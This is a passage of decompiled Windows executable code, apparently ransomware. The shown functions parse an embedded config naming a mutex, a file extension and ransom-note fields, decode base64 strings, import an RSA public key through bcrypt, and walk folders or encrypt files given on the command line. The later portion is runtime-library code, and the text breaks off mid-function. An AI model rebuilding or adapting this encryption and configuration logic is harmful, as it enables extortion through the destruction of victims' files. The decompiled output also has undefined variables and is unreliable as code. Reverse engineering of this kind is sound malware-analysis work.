  SIZE_T v64; // [esp-10h] [ebp-24h]
  SIZE_T v65; // [esp-10h] [ebp-24h]
  SIZE_T v69; // [esp-4h] [ebp-18h]
  _DWORD *v70; // [esp+4h] [ebp-10h]
  _DWORD *v71; // [esp+8h] [ebp-Ch]
  _DWORD *v72; // [esp+8h] [ebp-Ch]
  unsigned int v73; // [esp+Ch] [ebp-8h]
  int v74; // [esp+10h] [ebp-4h]

  result = dword_41E2EC;
  v73 = 0;
  if ( *(_DWORD *)(dword_41E2EC + 8) )
  {
    v4 = 0;
    v74 = 0;
    do
    {
      v5 = "mutex";
      v70 = (_DWORD *)(v4 + *(_DWORD *)(result + 12));
      v6 = *v70 - (_DWORD)"mutex";
      while ( 1 )
      {
        v7 = *v5;
        v8 = v5[v6];
        v9 = v7 + 32;
        if ( (unsigned int)(v7 - 65) > 0x19 )
          v9 = *v5;
        v10 = v8 + 32;
        if ( (unsigned int)(v8 - 65) > 0x19 )
          v10 = v8;
        if ( v10 != v9 )
          break;
        if ( !v8 )
        {
          v11 = v70[2];
          v12 = *(_DWORD *)(v11 + 8);
          v13 = *(_DWORD *)(v11 + 12);
          ProcessHeap = GetProcessHeap();
          v15 = (const CHAR *)HeapAlloc(ProcessHeap, 0, v12 + 4);
          v16 = v15;
          lpName = v15;
          if ( v12 > 0 )
          {
            v17 = v15;
            v18 = v13 - (_DWORD)v15;
            v19 = v12;
            do
            {
              v20 = (v17++)[v18];
              *((_BYTE *)v17 - 1) = v20;
              --v19;
            }
            while ( v19 );
          }
          v16[v12] = 0;
          break;
        }
        v6 = *v70 - (_DWORD)"mutex";
        ++v5;
      }
      v21 = "ext";
      v71 = (_DWORD *)(v74 + *(_DWORD *)(dword_41E2EC + 12));
      v22 = *v71 - (_DWORD)"ext";
      while ( 1 )
      {
        v23 = *v21;
        v24 = v21[v22];
        v25 = v23 + 32;
        if ( (unsigned int)(v23 - 65) > 0x19 )
          v25 = *v21;
        v26 = v24 + 32;
        if ( (unsigned int)(v24 - 65) > 0x19 )
          v26 = v24;
        if ( v26 != v25 )
          break;
        if ( !v24 )
        {
          v27 = *(_BYTE **)(v71[2] + 12);
          v28 = 0;
          if ( *v27 )
          {
            do
              ++v28;
            while ( v27[v28] );
          }
          v64 = 4 * v28 + 2;
          v29 = GetProcessHeap();
          v30 = HeapAlloc(v29, 0, v64);
          if ( sub_403CA0(v27) > 0 )
          {
            do
            {
              v30[v31] = (char)v27[v31];
              v32 = sub_403CA0(v27);
            }
            while ( v31 < v32 );
          }
          v33 = 0;
          if ( *v27 )
          {
            do
              ++v33;
            while ( v27[v33] );
          }
          dword_41E2E4 = (int)v30;
          v30[v33] = 0;
          dword_41E2DC = (int)sub_403EE0(v30);
          break;
        }
        v22 = *v71 - (_DWORD)"ext";
        ++v21;
      }
      v34 = "nt_name";
      v72 = (_DWORD *)(v74 + *(_DWORD *)(dword_41E2EC + 12));
      v35 = *v72 - (_DWORD)"nt_name";
      while ( 1 )
      {
        v36 = *v34;
        v37 = v34[v35];
        v38 = v36 + 32;
        if ( (unsigned int)(v36 - 65) > 0x19 )
          v38 = *v34;
        v39 = v37 + 32;
        if ( (unsigned int)(v37 - 65) > 0x19 )
          v39 = v37;
        if ( v39 != v38 )
          break;
        if ( !v37 )
        {
          v40 = 0;
          v41 = *(_BYTE **)(v72[2] + 12);
          if ( *v41 )
          {
            do
              ++v40;
            while ( v41[v40] );
          }
          v65 = 4 * v40 + 2;
          v42 = GetProcessHeap();
          v43 = HeapAlloc(v42, 0, v65);
          if ( sub_403CA0(v41) > 0 )
          {
            do
            {
              v43[v44] = (char)v41[v44];
              v45 = sub_403CA0(v41);
            }
            while ( v44 < v45 );
          }
          v46 = 0;
          if ( *v41 )
          {
            do
              ++v46;
            while ( v41[v46] );
          }
          dword_41E2E8 = (int)v43;
          v43[v46] = 0;
          break;
        }
        v35 = *v72 - (_DWORD)"nt_name";
        ++v34;
      }
      v47 = "nt_content";
      v48 = *(_DWORD *)(v74 + *(_DWORD *)(dword_41E2EC + 12)) - (_DWORD)"nt_content";
      while ( 1 )
      {
        v49 = *v47;
        v50 = v47[v48];
        v51 = v49 + 32;
        if ( (unsigned int)(v49 - 65) > 0x19 )
          v51 = *v47;
        v52 = v50 + 32;
        if ( (unsigned int)(v50 - 65) > 0x19 )
          v52 = v50;
        if ( v52 != v51 )
        {
          v53 = v74;
          goto LABEL_67;
        }
        if ( !v50 )
          break;
        v48 = *(_DWORD *)(v74 + *(_DWORD *)(dword_41E2EC + 12)) - (_DWORD)"nt_content";
        ++v47;
      }
      v53 = v74;
      dwBytes = 0;
      v54 = *(_BYTE **)(*(_DWORD *)(v74 + *(_DWORD *)(dword_41E2EC + 12) + 8) + 12);
      LibraryA = dword_41E330;
      if ( !dword_41E330 )
      {
        LibraryA = LoadLibraryA("crypt32.dll");
        dword_41E330 = LibraryA;
      }
      CryptStringToBinaryA = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_41E310;
      if ( !dword_41E310 )
      {
        CryptStringToBinaryA = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(LibraryA, "CryptStringToBinaryA");
        dword_41E310 = (int)CryptStringToBinaryA;
      }
      v57 = 0;
      if ( *v54 )
      {
        do
          ++v57;
        while ( v54[v57] );
      }
      ((void (__stdcall *)(_BYTE *, int, int, _DWORD, DWORD *, _DWORD, _DWORD, DWORD *, int, int))CryptStringToBinaryA)(
        v54,
        v57,
        1,
        0,
        &dwBytes,
        0,
        0,
        a2,
        a3,
        a1);
      v69 = dwBytes;
      v58 = GetProcessHeap();
      v59 = HeapAlloc(v58, 0, v69);
      lpBuffer = v59;
      v60 = *(_BYTE **)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + v74 + 8) + 12);
      v61 = dword_41E330;
      if ( !dword_41E330 )
      {
        v61 = LoadLibraryA("crypt32.dll");
        dword_41E330 = v61;
      }
      ProcAddress = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_41E310;
      if ( !dword_41E310 )
      {
        ProcAddress = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(
                                                                                                     v61,
                                                                                                     "CryptStringToBinaryA");
        dword_41E310 = (int)ProcAddress;
      }
      v63 = 0;
      if ( *v60 )
      {
        do
          ++v63;
        while ( v60[v63] );
      }
      a1 = 0;
      a3 = 0;
      a2 = &dwBytes;
      ((void (__stdcall *)(_BYTE *, int, int, const void *))ProcAddress)(v60, v63, 1, v59);
LABEL_67:
      v4 = v53 + 12;
      result = dword_41E2EC;
      ++v73;
      v74 = v4;
    }
    while ( v73 < *(_DWORD *)(dword_41E2EC + 8) );
  }
  return result;
}
// 4035E0: could not find valid save-restore pair for ebx
// 4035E0: could not find valid save-restore pair for edi
// 4035E0: could not find valid save-restore pair for esi
// 403720: variable 'v31' is possibly undefined
// 4037F0: variable 'v44' is possibly undefined
// 41E2DC: using guessed type int dword_41E2DC;
// 41E2E4: using guessed type int dword_41E2E4;
// 41E2E8: using guessed type int dword_41E2E8;
// 41E2EC: using guessed type int dword_41E2EC;
// 41E310: using guessed type int dword_41E310;

//----- (00403990) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  HANDLE ProcessHeap; // eax
  HANDLE v5; // eax
  __int128 *v6; // eax
  int v7; // ecx
  char *v8; // edi
  char *v9; // edx
  char v10; // al
  int v11; // ecx
  __int128 *v12; // edx
  char *v13; // esi
  char v14; // al
  HMODULE LibraryA; // eax
  BOOL (__stdcall *CryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // edx
  DWORD v17; // ecx
  HANDLE v18; // eax
  BYTE *v19; // eax
  HMODULE v20; // ecx
  BOOL (__stdcall *ProcAddress)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // eax
  DWORD v22; // ecx
  __int16 *CommandLineW; // eax
  _DWORD *v24; // eax
  _DWORD *v25; // esi
  SIZE_T v27; // [esp+24h] [ebp-254h]
  BYTE *v28; // [esp+38h] [ebp-240h] BYREF
  __int128 *v29; // [esp+3Ch] [ebp-23Ch]
  char *v30; // [esp+40h] [ebp-238h]
  SIZE_T dwBytes; // [esp+44h] [ebp-234h] BYREF
  __int128 v32; // [esp+48h] [ebp-230h] BYREF
  __int64 v33; // [esp+58h] [ebp-220h]
  wchar_t v34[262]; // [esp+68h] [ebp-210h] BYREF
  int savedregs; // [esp+278h] [ebp+0h] BYREF

  sub_401490((int)"[+] Getting all settings...\n");
  ProcessHeap = GetProcessHeap();
  v30 = (char *)HeapAlloc(ProcessHeap, 0, 0x10u);
  v5 = GetProcessHeap();
  v6 = (__int128 *)HeapAlloc(v5, 0, 0x10u);
  v7 = 0;
  v29 = v6;
  do
    ++v7;
  while ( byte_41B984[v7] );
  v8 = v30;
  v9 = v30;
  if ( v7 )
  {
    do
    {
      v10 = (v9++)[byte_41B984 - v8];
      *(v9 - 1) = v10;
      --v7;
    }
    while ( v7 );
    v6 = v29;
  }
  v11 = 0;
  do
    ++v11;
  while ( byte_41B998[v11] );
  v12 = v6;
  if ( v11 )
  {
    v13 = (char *)(byte_41B998 - (char *)v6);
    do
    {
      v14 = *((_BYTE *)v12 + (_DWORD)v13);
      v12 = (__int128 *)((char *)v12 + 1);
      *((_BYTE *)v12 - 1) = v14;
      --v11;
    }
    while ( v11 );
  }
  LibraryA = dword_41E330;
  dwBytes = 0;
  if ( !dword_41E330 )
  {
    LibraryA = LoadLibraryA("crypt32.dll");
    dword_41E330 = LibraryA;
  }
  CryptStringToBinaryA = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_41E310;
  if ( !dword_41E310 )
  {
    CryptStringToBinaryA = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(LibraryA, "CryptStringToBinaryA");
    dword_41E310 = (int)CryptStringToBinaryA;
  }
  v17 = 0;
  do
    ++v17;
  while ( byte_41A878[v17] );
  CryptStringToBinaryA(byte_41A878, v17, 1, 0, &dwBytes, 0, 0);
  v27 = dwBytes;
  v18 = GetProcessHeap();
  v19 = (BYTE *)HeapAlloc(v18, 0, v27);
  v20 = dword_41E330;
  v28 = v19;
  if ( !dword_41E330 )
  {
    v20 = LoadLibraryA("crypt32.dll");
    dword_41E330 = v20;
  }
  ProcAddress = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_41E310;
  if ( !dword_41E310 )
  {
    ProcAddress = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(
                                                                                                 v20,
                                                                                                 "CryptStringToBinaryA");
    dword_41E310 = (int)ProcAddress;
  }
  v22 = 0;
  do
    ++v22;
  while ( byte_41A878[v22] );
  ProcAddress(byte_41A878, v22, 1, v28, &dwBytes, 0, 0);
  sub_401250((int)v28, dwBytes, v30, v29, v29);
  v32 = 0i64;
  v33 = 0i64;
  dword_41E2EC = (int)sub_402560(v28, (int)&v32, (unsigned int)&savedregs, 0x1000u);
  if ( !dword_41E2EC )
  {
    sub_401490((int)"[-] Failed to get ttructure...\n");
    Sleep(0x1388u);
    ExitProcess(1u);
  }
  sub_4035E0(v3, (DWORD *)GetProcAddress, (int)v28);
  sub_401490((int)"[+] Checking mutex...\n");
  CreateMutexA(0, 0, lpName);
  if ( GetLastError() != 183 )
  {
    sub_401490((int)"[+] Importing pub...\n");
    sub_403F60((int)GetProcAddress);
    sub_401490((int)"[+] Getting argument list...\n");
    CommandLineW = (__int16 *)GetCommandLineW();
    v24 = sub_403DA0(CommandLineW, &v28);
    v25 = v24;
    if ( (int)v28 <= 1 )
    {
      sub_401490((int)"[+] Starting all threads...\n");
      sub_4021A0();
    }
    else if ( sub_403D10((LPCWSTR)v24[1]) )
    {
      sub_403CC0((int)v34, v25[1]);
      sub_403CE0(v34, L"\\");
      sub_401490((int)"[+] Searching in: %S\n", v34);
      sub_401660(v34);
    }
    else
    {
      sub_401490((int)"[+] Encrypting: %S\n", (const wchar_t *)v25[1]);
      sub_401A90((const WCHAR *)v25[1]);
    }
    Sleep(0x1388u);
    ExitProcess(0);
  }
  return 0;
}
// 403B93: variable 'v3' is possibly undefined
// 41A82C: using guessed type wchar_t asc_41A82C[2];
// 41E2EC: using guessed type int dword_41E2EC;
// 41E310: using guessed type int dword_41E310;
// 403990: using guessed type wchar_t var_210[262];

//----- (00403CA0) --------------------------------------------------------
int __thiscall sub_403CA0(_BYTE *this)
{
  int result; // eax

  result = 0;
  if ( *this )
  {
    do
      ++result;
    while ( this[result] );
  }
  return result;
}

//----- (00403CB0) --------------------------------------------------------
int __thiscall sub_403CB0(_WORD *this)
{
  int result; // eax

  result = 0;
  if ( *this )
  {
    do
      ++result;
    while ( this[result] );
  }
  return result;
}

//----- (00403CC0) --------------------------------------------------------
_WORD *__fastcall sub_403CC0(int a1, int a2)
{
  _WORD *result; // eax
  int v3; // edx
  __int16 v4; // cx

  result = (_WORD *)(a1 - 2);
  v3 = ((a2 - a1) >> 1) + 1;
  do
  {
    v4 = result[v3];
    *++result = v4;
  }
  while ( v4 );
  return result;
}

//----- (00403CE0) --------------------------------------------------------
_WORD *__fastcall sub_403CE0(_WORD *a1, __int16 *a2)
{
  _WORD *v3; // eax
  _WORD *v5; // eax
  __int16 v6; // cx

  v3 = a1;
  while ( *v3++ )
    ;
  v5 = v3 - 2;
  do
  {
    v6 = *a2;
    *++v5 = *a2++;
  }
  while ( v6 );
  return a1;
}

//----- (00403D10) --------------------------------------------------------
DWORD __thiscall sub_403D10(LPCWSTR lpFileName)
{
  int v2; // edx
  LPCWSTR v3; // eax
  int v4; // ecx
  LPCWSTR v5; // ecx
  int v6; // edx
  WCHAR v7; // si
  WCHAR v8; // ax
  DWORD FileAttributesW; // eax

  if ( lpFileName )
  {
    v2 = *lpFileName;
    if ( v2 != 92 || lpFileName[1] != 92 )
      goto LABEL_23;
    v3 = lpFileName + 2;
    while ( 1 )
    {
      v4 = *v3;
      if ( v4 == 92 )
        break;
      ++v3;
      if ( !(_WORD)v4 )
      {
        v3 = 0;
        break;
      }
    }
    if ( v3 )
    {
LABEL_23:
      if ( v2 != 92 )
        goto LABEL_18;
      v5 = lpFileName + 2;
      if ( lpFileName[1] != 92 )
        goto LABEL_18;
      v6 = 0;
      if ( !*v5 )
        goto LABEL_18;
      v7 = *v5;
      do
      {
        if ( v7 == 92 )
        {
          if ( v6 )
            goto LABEL_18;
          v6 = 1;
        }
        v8 = v5[1];
        ++v5;
        v7 = v8;
      }
      while ( v8 );
      if ( !v6 )
      {
LABEL_18:
        FileAttributesW = GetFileAttributesW(lpFileName);
        if ( FileAttributesW != -1 )
          return FileAttributesW & 0x10;
      }
    }
  }
  return 0;
}

//----- (00403DA0) --------------------------------------------------------
_DWORD *__fastcall sub_403DA0(__int16 *a1, _DWORD *a2)
{
  __int16 *v2; // edi
  int v3; // eax
  unsigned int v4; // eax
  unsigned int v5; // esi
  _DWORD *result; // eax
  int v7; // ebx
  _DWORD *v8; // ecx
  int v9; // esi
  __int16 v10; // dx
  char v11; // cl
  _WORD *v12; // eax
  _WORD *v14; // [esp+10h] [ebp-Ch]
  _DWORD *v15; // [esp+14h] [ebp-8h]
  char v16; // [esp+19h] [ebp-3h]
  char v17; // [esp+1Ah] [ebp-2h]
  char v18; // [esp+1Bh] [ebp-1h]

  v2 = a1;
  v3 = 0;
  if ( *a1 )
  {
    do
      ++v3;
    while ( a1[v3] );
  }
  v4 = v3 + 2;
  v5 = v4 >> 1;
  result = GlobalAlloc(0, 4 * ((v4 >> 1) + v4) + 4);
  v15 = result;
  v7 = 0;
  v18 = 1;
  v17 = 0;
  v8 = &result[2 * v5 + 2];
  v9 = 0;
  *result = v8;
  v10 = *v2;
  v14 = v8;
  v11 = 0;
  v16 = 0;
  if ( *v2 )
  {
    v12 = v14;
    do
    {
      if ( v11 )
      {
        if ( v10 == 34 )
        {
          v11 = 0;
          v16 = 0;
        }
        else
        {
LABEL_18:
          ++v9;
          *v12++ = v10;
        }
      }
      else
      {
        switch ( v10 )
        {
          case 9:
          case 10:
          case 13:
          case 32:
            if ( v17 )
            {
              ++v9;
              *v12++ = 0;
            }
            v11 = v16;
            v17 = 0;
            v18 = 1;
            break;
          case 34:
            v11 = 1;
            v16 = 1;
            v17 = 1;
            if ( v18 )
              v15[v7++] = v12;
            v18 = 0;
            break;
          default:
            v17 = 1;
            if ( v18 )
              v15[v7++] = v12;
            v11 = v16;
            v18 = 0;
            goto LABEL_18;
        }
      }
      v10 = v2[1];
      ++v2;
    }
    while ( v10 );
    result = v15;
  }
  v14[v9] = 0;
  result[v7] = 0;
  *a2 = v7;
  return result;
}

//----- (00403EE0) --------------------------------------------------------
_BYTE *__thiscall sub_403EE0(_WORD *this)
{
  int v2; // eax
  HANDLE ProcessHeap; // eax
  _BYTE *v4; // edi
  int v5; // edx
  int v6; // eax
  int v7; // eax
  SIZE_T v10; // [esp-4h] [ebp-Ch]

  v2 = 0;
  if ( *this )
  {
    do
      ++v2;
    while ( this[v2] );
  }
  v10 = 4 * v2 + 1;
  ProcessHeap = GetProcessHeap();
  v4 = HeapAlloc(ProcessHeap, 0, v10);
  if ( sub_403CB0(this) > 0 )
  {
    do
    {
      v4[v5] = this[v5];
      v6 = sub_403CB0(this);
    }
    while ( v5 < v6 );
  }
  v7 = 0;
  if ( *this )
  {
    while ( this[++v7] != 0 )
      ;
    v4[v7] = 0;
    return v4;
  }
  else
  {
    *v4 = 0;
    return v4;
  }
}
// 403F20: variable 'v5' is possibly undefined

//----- (00403F60) --------------------------------------------------------
BOOL __usercall sub_403F60@<eax>(int a1@<edi>)
{
  _BYTE *v1; // esi
  HMODULE LibraryA; // eax
  BOOL (__stdcall *CryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // edx
  int v4; // ecx
  HANDLE ProcessHeap; // eax
  const CHAR *v6; // esi
  HMODULE v7; // ecx
  BOOL (__stdcall *ProcAddress)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // eax
  DWORD v9; // ecx
  BYTE *v10; // ebx
  HMODULE LibraryW; // edx
  FARPROC v12; // eax
  HMODULE v13; // edx
  FARPROC v14; // eax
  HANDLE v15; // eax
  SIZE_T v17; // [esp-4h] [ebp-1Ch]
  int v18; // [esp+8h] [ebp-10h]
  BYTE *lpMem; // [esp+Ch] [ebp-Ch]
  LPVOID lpMema; // [esp+Ch] [ebp-Ch]
  SIZE_T dwBytes; // [esp+10h] [ebp-8h] BYREF

  dwBytes = 0;
  v1 = *(_BYTE **)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 44) + 12);
  LibraryA = dword_41E330;
  if ( !dword_41E330 )
  {
    LibraryA = LoadLibraryA("crypt32.dll");
    dword_41E330 = LibraryA;
  }
  CryptStringToBinaryA = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_41E310;
  if ( !dword_41E310 )
  {
    CryptStringToBinaryA = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(LibraryA, "CryptStringToBinaryA");
    dword_41E310 = (int)CryptStringToBinaryA;
  }
  v4 = 0;
  if ( *v1 )
  {
    do
      ++v4;
    while ( v1[v4] );
  }
  ((void (__stdcall *)(_BYTE *, int, int, _DWORD, SIZE_T *, _DWORD, _DWORD, int))CryptStringToBinaryA)(
    v1,
    v4,
    1,
    0,
    &dwBytes,
    0,
    0,
    a1);
  v17 = dwBytes;
  ProcessHeap = GetProcessHeap();
  lpMem = (BYTE *)HeapAlloc(ProcessHeap, 0, v17);
  v6 = *(const CHAR **)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 44) + 12);
  v7 = dword_41E330;
  if ( !dword_41E330 )
  {
    v7 = LoadLibraryA("crypt32.dll");
    dword_41E330 = v7;
  }
  ProcAddress = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_41E310;
  if ( !dword_41E310 )
  {
    ProcAddress = (BOOL (__stdcall *)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(
                                                                                                 v7,
                                                                                                 "CryptStringToBinaryA");
    dword_41E310 = (int)ProcAddress;
  }
  v9 = 0;
  if ( *v6 )
  {
    do
      ++v9;
    while ( v6[v9] );
  }
  v10 = lpMem;
  ProcAddress(v6, v9, 1, lpMem, &dwBytes, 0, 0);
  LibraryW = dword_41E328;
  if ( !dword_41E328 )
  {
    LibraryW = LoadLibraryW(L"bcrypt.dll");
    dword_41E328 = LibraryW;
  }
  v12 = (FARPROC)dword_41E32C;
  if ( !dword_41E32C )
  {
    v12 = GetProcAddress(
            LibraryW,
            *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 8) + 12));
    dword_41E32C = (int)v12;
  }
  ((void (__stdcall *)(int *, const wchar_t *, _DWORD, _DWORD))v12)(&dword_41E2D4, L"RSA", 0, 0);
  v13 = dword_41E324;
  lpMema = (LPVOID)dwBytes;
  v18 = dword_41E2D4;
  if ( !dword_41E324 )
  {
    v13 = LoadLibraryW(L"bcrypt.dll");
    dword_41E324 = v13;
  }
  v14 = (FARPROC)dword_41E31C;
  if ( !dword_41E31C )
  {
    v14 = GetProcAddress(
            v13,
            *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 16) + 12));
    dword_41E31C = (int)v14;
  }
  if ( ((int (__stdcall *)(int, _DWORD, const wchar_t *, int *, BYTE *, LPVOID))v14)(
         v18,
         0,
         L"RSAPUBLICBLOB",
         &dword_41E2D0,
         v10,
         lpMema) < 0 )
  {
    sub_401490((int)"[-] Failed to import RSA public key...\n");
    Sleep(0x1388u);
    ExitProcess(0);
  }
  v15 = GetProcessHeap();
  return HeapFree(v15, 0, v10);
}
// 403F60: could not find valid save-restore pair for edi
// 41B938: using guessed type wchar_t aRsa[4];
// 41B940: using guessed type wchar_t aRsapublicblob[14];
// 41E2D0: using guessed type int dword_41E2D0;
// 41E2D4: using guessed type int dword_41E2D4;
// 41E2EC: using guessed type int dword_41E2EC;
// 41E310: using guessed type int dword_41E310;
// 41E31C: using guessed type int dword_41E31C;
// 41E32C: using guessed type int dword_41E32C;

//----- (00404334) --------------------------------------------------------
int sub_404334()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 404809: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (0040433C) --------------------------------------------------------
int sub_40433C()
{
  int v0; // eax

  sub_4049A0();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (004047C3) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (004047C6) --------------------------------------------------------
int sub_4047C6()
{
  return 1;
}

//----- (004047D0) --------------------------------------------------------
void sub_4047D0()
{
  InitializeSListHead(&ListHead);
}

//----- (004047DC) --------------------------------------------------------
char sub_4047DC()
{
  return 1;
}

//----- (00404803) --------------------------------------------------------
void *sub_404803()
{
  return &unk_41DBF8;
}

//----- (00404826) --------------------------------------------------------
BOOL sub_404826()
{
  return dword_41D00C == 0;
}
// 41D00C: using guessed type int dword_41D00C;

//----- (00404832) --------------------------------------------------------
void *sub_404832()
{
  return &unk_41E340;
}

//----- (00404838) --------------------------------------------------------
void *sub_404838()
{
  return &unk_41E33C;
}

//----- (004049A0) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_4049A0()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00404A02) --------------------------------------------------------
void sub_404A02()
{
  dword_41DC00 = 0;
}
// 41DC00: using guessed type int dword_41DC00;

//----- (00404A0A) --------------------------------------------------------
void sub_404A0A()
{
  ;
}
// 404A0A: could not find valid save-restore pair for edi

//----- (00404A36) --------------------------------------------------------
void __cdecl sub_404A36()
{
  ;
}
// 404A36: could not find valid save-restore pair for edi

//----- (00406B6A) --------------------------------------------------------
char __thiscall sub_406B6A(void *this)
{
  if ( sub_406B89((int)this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (00406B89) --------------------------------------------------------
char __thiscall sub_406B89(int this)
{
  char result; // al

  result = unknown_libname_10(0);
  if ( result )
  {
    if ( (unsigned __int8)__crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(*(_BYTE *)(this + 49)) )
      ++*(_DWORD *)(this + 24);
    else
      *(_DWORD *)(this + 24) = -1;
    return 1;
  }
  return result;
}
// 406BC3: using guessed type _DWORD __stdcall unknown_libname_10(_DWORD);
// 4075A3: using guessed type _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(char);

//----- (00406C30) --------------------------------------------------------
char __thiscall sub_406C30(int this)
{
  int *v1; // edx
  int v3; // eax

  v1 = (int *)(this + 40);
  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_8(this + 40);
  *(_DWORD *)(this + 20) += 4;
  v3 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *v1 = v3;
  if ( v3 < 0 )
    *v1 = -1;
  return 1;
}
// 4069A5: using guessed type _DWORD __stdcall unknown_libname_8(_DWORD);

//----- (00406C56) --------------------------------------------------------
char __thiscall sub_406C56(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  int v4; // eax
  char *v5; // edx
  char v6; // al
  _BYTE *v7; // eax
  int v8; // [esp-4h] [ebp-4h]

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_406DA4((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *((_DWORD *)this + 11) )
    goto LABEL_7;
  if ( v1 > 106 )
  {
    if ( v1 != 108 )
    {
      switch ( v1 )
      {
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
      return 1;
    }
    v7 = (_BYTE *)*((_DWORD *)this + 4);
    if ( *v7 == 108 )
    {
      *((_DWORD *)this + 4) = v7 + 1;
      v8 = 4;
    }
    else
    {
      v8 = 3;
    }
    goto LABEL_44;
  }
  switch ( v1 )
  {
    case 'j':
      *((_DWORD *)this + 11) = 5;
      return 1;
    case 'I':
      v5 = (char *)*((_DWORD *)this + 4);
      v6 = *v5;
      if ( *v5 == 51 && v5[1] == 50 )
      {
        *((_DWORD *)this + 11) = 10;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 54 && v5[1] == 52 )
      {
        *((_DWORD *)this + 11) = 11;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 100 || v6 == 105 || v6 == 111 || v6 == 117 || v6 == 120 || v6 == 88 )
      {
        *((_DWORD *)this + 11) = 9;
      }
      return 1;
    case 'L':
      *((_DWORD *)this + 11) = 8;
      return 1;
    case 'T':
      *((_DWORD *)this + 11) = 13;
      return 1;
    case 'h':
      v3 = (_BYTE *)*((_DWORD *)this + 4);
      if ( *v3 == 104 )
      {
        *((_DWORD *)this + 4) = v3 + 1;
        v4 = 1;
LABEL_45:
        *((_DWORD *)this + 11) = v4;
        return 1;
      }
      v8 = 2;
LABEL_44:
      v4 = v8;
      goto LABEL_45;
  }
  return 1;
}

//----- (00406DA4) --------------------------------------------------------
char __thiscall sub_406DA4(int this)
{
  int v2; // eax
  char v3; // al
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // ebx
  char v11; // dl
  bool v12; // bl
  bool v13; // al
  char v14; // al
  int v15; // edi
  char v16; // [esp-4h] [ebp-14h]
  int v17; // [esp+8h] [ebp-8h]
  __int16 v18; // [esp+Ch] [ebp-4h] BYREF
  char v19; // [esp+Eh] [ebp-2h]

  v2 = *(char *)(this + 49);
  if ( v2 <= 100 )
  {
    if ( v2 != 100 )
    {
      if ( v2 > 88 )
      {
        v5 = v2 - 90;
        if ( !v5 )
        {
          v3 = unknown_libname_11(this);
          goto LABEL_11;
        }
        v6 = v5 - 7;
        if ( !v6 )
          goto LABEL_31;
        if ( v6 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v2 != 88 )
      {
        if ( v2 != 65 )
        {
          if ( v2 != 67 )
          {
            if ( v2 <= 68 )
              return 0;
            if ( v2 > 71 )
            {
              if ( v2 == 83 )
              {
LABEL_10:
                v3 = unknown_libname_14(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v3 = sub_4071FE(0);
          goto LABEL_11;
        }
LABEL_31:
        v3 = unknown_libname_12(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v3 = sub_40728E(this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v2 > 112 )
